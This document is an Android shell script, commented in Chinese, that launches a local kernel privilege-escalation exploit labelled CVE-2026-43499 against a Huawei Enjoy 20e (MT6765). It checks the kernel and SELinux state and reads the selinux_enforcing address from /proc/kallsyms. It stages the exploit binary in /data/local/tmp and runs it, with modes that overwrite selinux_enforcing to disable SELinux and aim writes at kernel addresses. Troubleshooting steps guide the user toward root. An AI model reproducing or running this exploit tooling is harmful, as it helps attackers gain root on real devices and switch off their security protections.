#!/system/bin/sh
# ============================================================
# CVE-2026-43499 ARM32 Exploit v3.0.1 - Termux 运行脚本 v3.0.1
# 目标: 华为畅享20e (MLD-AL10, MT6765, 内核 4.14.141+)
#
# v2 变更:
#   - 触发方式重写为 3 线程 + FUTEX_CMP_REQUEUE_PI 死锁回滚
#     (对齐官方修复补丁 3bfdc63936dd 描述的漏洞路径)
#   - 新增用户态伪锁"泄露验证"模式 (默认): 链行走只写用户内存,
#     不碰内核地址, 完全安全; 若看到内核栈地址泄露即证明利用链打通
#   - selinux_enforcing 写 0 改为试验模式 (-s), 可能崩溃
#
# 使用方法:
#   1. 将 exploit 和 run.sh 复制到手机任意目录
#      (推荐: /sdcard/Download/cve_2026_43499/ 或 ~/cve_2026_43499)
#   2. 运行: sh run.sh
#
# 参数:
#   sh run.sh          # 默认: 触发 + 用户态伪锁泄露验证 (安全)
#   sh run.sh -t       # 测试模式: 只触发 UAF + stamp, 不执行链行走
#   sh run.sh -d       # 调试模式
#   sh run.sh -s       # 原方案: 尝试把 selinux_enforcing 写 0 (试验)
#   sh run.sh -k 0xADDR  # Stage2: 链行走锁指向内核全局地址 (试验)
# ============================================================

# ── 获取脚本所在目录 ──
SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
if [ -z "$SCRIPT_DIR" ]; then
    SCRIPT_DIR="$PWD"
fi
if [ -z "$SCRIPT_DIR" ] || [ "$SCRIPT_DIR" = "/" ]; then
    case "$0" in
        /*) SCRIPT_DIR="$(dirname "$0")" ;;
        *) SCRIPT_DIR="$PWD" ;;
    esac
fi

EXPLOIT="$SCRIPT_DIR/exploit"
LOG_FILE="$SCRIPT_DIR/cve_2026_43499.log"

print_msg() {
    printf '%s\n' "$1"
}

print_msg ""
print_msg "============================================"
print_msg " CVE-2026-43499 ARM32 Exploit v3.0.1"
print_msg " Target: MT6765 (Huawei Changxiang 20e)"
print_msg " Trigger: 3-thread CMP_REQUEUE_PI deadlock"
print_msg "============================================"
print_msg ""

# ── 检查是否已经是 root ──
if [ "$(id -u)" = "0" ] 2>/dev/null; then
    print_msg "[+] 已经是 root!"
    exit 0
fi

# ── 架构与内核检查 ──
ARCH=$(uname -m 2>/dev/null)
KVER=$(uname -r 2>/dev/null)
print_msg "[*] 架构: $ARCH"
print_msg "[*] 内核: $KVER"

case "$ARCH" in
    armv7l|armv8l)
        print_msg "[+] ARM32 架构确认"
        ;;
    aarch64|arm64)
        print_msg "[!] 警告: ARM64 设备, 但 Android 有 32 位兼容层, 可尝试"
        ;;
    *)
        print_msg "[!] 警告: 未知架构 $ARCH (本 exploit 仅支持 ARM32)"
        ;;
esac

KMAJOR=$(echo "$KVER" | cut -d. -f1)
KMINOR=$(echo "$KVER" | cut -d. -f2)
print_msg "[*] 内核版本: $KMAJOR.$KMINOR"
print_msg "[*] 受影响范围: 2.6.39 ~ 7.1 (4.14.141 在范围内)"
print_msg "[*] 注意: 若厂商已合并 3bfdc63936dd 修复则无效"

# ── 检查 CPU ──
if [ -f /proc/cpuinfo ]; then
    CPU_CORES=$(grep -c ^processor /proc/cpuinfo 2>/dev/null)
    print_msg "[*] CPU 核心数: $CPU_CORES"
fi

# ── 检查 exploit 二进制 ──
if [ ! -f "$EXPLOIT" ]; then
    print_msg "[-] 找不到 exploit 二进制: $EXPLOIT"
    print_msg "[-] 请确保 exploit 文件与此脚本在同一目录"
    ls -la "$SCRIPT_DIR" 2>/dev/null
    exit 1
fi

chmod 755 "$EXPLOIT" 2>/dev/null
if [ ! -x "$EXPLOIT" ]; then
    print_msg "[!] 无法设置执行权限, 尝试复制到 /data/local/tmp"
    cp "$EXPLOIT" /data/local/tmp/exploit 2>/dev/null
    if [ -f /data/local/tmp/exploit ]; then
        chmod 755 /data/local/tmp/exploit 2>/dev/null
        EXPLOIT="/data/local/tmp/exploit"
        SCRIPT_DIR="/data/local/tmp"
        print_msg "[+] 已复制到 /data/local/tmp"
    else
        print_msg "[-] 无法复制到 /data/local/tmp"
        print_msg "[-] 请手动: cp exploit /data/local/tmp/ && chmod 755 /data/local/tmp/exploit"
        exit 1
    fi
fi

# ── 检查 SELinux ──
if [ -f /sys/fs/selinux/enforce ]; then
    SELINUX=$(cat /sys/fs/selinux/enforce 2>/dev/null)
    print_msg "[*] SELinux: $([ "$SELINUX" = "1" ] && echo Enforcing || echo Permissive)"
fi

# ── 尝试读取 selinux_enforcing 符号 (供 -s 试验模式) ──
SELINUX_SYM=""
if [ -r /proc/kallsyms ]; then
    SE=$(grep -m1 -w "selinux_enforcing" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    if [ -n "$SE" ] && [ "$SE" != "0000000000000000" ] && [ "$SE" != "0" ]; then
        SELINUX_SYM="0x$SE"
        print_msg "[+] kallsyms: selinux_enforcing = $SELINUX_SYM"
    else
        print_msg "[!] kallsyms 地址被屏蔽 (kptr_restrict>0) 或符号不可读"
    fi
else
    print_msg "[!] /proc/kallsyms 不可读"
fi
if [ -f /proc/sys/kernel/kptr_restrict ]; then
    print_msg "[*] kptr_restrict = $(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)"
fi

# ── 构建命令行参数 ──
ARGS=""
USE_SELINUX=0
while [ $# -gt 0 ]; do
    case "$1" in
        -t|-d|-h|-p)
            ARGS="$ARGS $1"
            if [ "$1" = "-p" ] && [ $# -gt 1 ]; then
                shift
                ARGS="$ARGS $1"
            fi
            shift
            ;;
        -s)
            USE_SELINUX=1
            shift
            ;;
        -k)
            ARGS="$ARGS $1"
            if [ $# -gt 1 ]; then
                shift
                ARGS="$ARGS $1"
            fi
            shift
            ;;
        *)
            shift
            ;;
    esac
done

if [ "$USE_SELINUX" = "1" ]; then
    if [ -n "$SELINUX_SYM" ]; then
        ARGS="$ARGS -s $SELINUX_SYM"
        print_msg "[*] 使用 selinux_enforcing 试验模式: $SELINUX_SYM"
    else
        print_msg "[-] 未获取到 selinux_enforcing 地址, 无法使用 -s"
        print_msg "[-] 可手动: sh run.sh -s 0x<地址>"
        exit 1
    fi
fi

# ── 运行 exploit ──
print_msg ""
print_msg "============================================"
print_msg "[*] 命令: $EXPLOIT $ARGS"
print_msg "============================================"
print_msg ""
print_msg "[*] 提示: 应先运行 'sh run.sh -t' 验证 UAF 触发"
print_msg "[*] 默认模式不写任何内核地址 (用户态伪锁), 安全"
print_msg ""

"$EXPLOIT" $ARGS 2>&1 | tee "$LOG_FILE"
EXIT_CODE=$?

print_msg ""
print_msg "============================================"
if [ $EXIT_CODE -eq 0 ]; then
    print_msg "[+] EXPLOIT 流程完成!"
    print_msg "[+] 日志: $LOG_FILE"
else
    print_msg "[-] Exploit 退出码: $EXIT_CODE"
    print_msg "[-] 日志: $LOG_FILE"
    print_msg ""
    print_msg "故障排除 (按顺序):"
    print_msg "  1. sh run.sh -t  → 只触发 UAF, 验证漏洞存在"
    print_msg "     (设备崩溃重启 = 漏洞确认; 无崩溃则检查 3bfdc63936dd 是否已修复)"
    print_msg "  2. 看日志中的 user fake lock 值:"
    print_msg "     rb_node/rb_leftmost 出现 0xC0xxxxxx 内核地址 = 链行走打通"
    print_msg "  3. 若链行走未打通: 换 stamp 偏移 / 调整 -p 优先级"
    print_msg "  4. 链打通后再尝试 -s (selinux_enforcing 写 0, 可能崩溃)"
    print_msg "  5. Termux 被 seccomp 屏蔽的 syscall 由 SIGSYS 自动跳过"
    print_msg ""
    print_msg "日志内容:"
    head -50 "$LOG_FILE" 2>/dev/null
fi
print_msg "============================================"

exit $EXIT_CODE
